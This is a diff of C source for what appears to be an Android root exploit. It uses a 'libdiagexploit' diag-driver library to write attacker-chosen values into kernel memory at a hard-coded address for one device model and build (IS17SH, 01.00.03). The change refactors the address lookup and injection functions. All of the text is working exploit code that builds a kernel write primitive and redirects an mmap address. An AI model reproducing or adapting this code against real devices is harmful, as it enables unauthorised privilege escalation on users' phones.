@@ -27,7 +27,7 @@
 #include <stdbool.h>
 #include <sys/system_properties.h>
 
-#include "diag.h"
+#include "libdiagexploit/diag.h"
 
 #define PAGE_SHIFT 12
 #define PAGE_OFFSET 0xC0000000
@@ -37,17 +37,16 @@ typedef struct _supported_device {
   const char *device;
   const char *build_id;
   unsigned long int shlcdc_base_addr;
-  unsigned long int delayed_rsp_id_address;
 } supported_device;
 
 supported_device supported_devices[] = {
-  { "IS17SH", "01.00.03", 0xc0fe848c, 0xc0a546f0 }
+  { "IS17SH", "01.00.03", 0xc0fe848c }
 };
 
 static int n_supported_devices = sizeof(supported_devices) / sizeof(supported_devices[0]);
 
-static bool
-detect_injection_addresses(diag_injection_addresses *injection_addresses)
+static unsigned long int
+get_shlcdc_base_addr(void)
 {
   int i;
   char device[PROP_VALUE_MAX];
@@ -59,45 +58,37 @@ detect_injection_addresses(diag_injection_addresses *injection_addresses)
   for (i = 0; i < n_supported_devices; i++) {
     if (!strcmp(device, supported_devices[i].device) &&
         !strcmp(build_id, supported_devices[i].build_id)) {
-      injection_addresses->target_address =
-        supported_devices[i].shlcdc_base_addr;
-      injection_addresses->delayed_rsp_id_address =
-        supported_devices[i].delayed_rsp_id_address;
-        return true;
+      return supported_devices[i].shlcdc_base_addr;
     }
   }
   printf("%s (%s) is not supported.\n", device, build_id);
 
-  return false;
+  return 0;
 }
 
 static bool
-inject_address(unsigned int address,
-               diag_injection_addresses *injection_addresses)
+inject_address(unsigned int address)
 {
-  struct values injection_data[2];
+  struct diag_values injection_data[2];
+  unsigned long int target_address;
 
-  injection_data[0].address = injection_addresses->target_address;
+  target_address = get_shlcdc_base_addr();
+  if (!target_address)
+    return false;
+
+  injection_data[0].address = target_address;
   injection_data[0].value = (address & 0xffff);
 
-  injection_data[1].address = injection_addresses->target_address + 2;
+  injection_data[1].address = target_address + 2;
   injection_data[1].value = (address & 0xffff0000) >> 16;
 
-  return inject(injection_data, 2,
-                injection_addresses->delayed_rsp_id_address) == 0;
+  return diag_inject(injection_data, 2) == 0;
 }
 
 static bool
 set_mmap_address(unsigned long address)
 {
-  bool ret;
-
-  diag_injection_addresses injection_addresses;
-  if (!detect_injection_addresses(&injection_addresses)) {
-    return false;
-  }
-
-  return inject_address(address, &injection_addresses);
+  return inject_address(address);
 }
 
 static bool
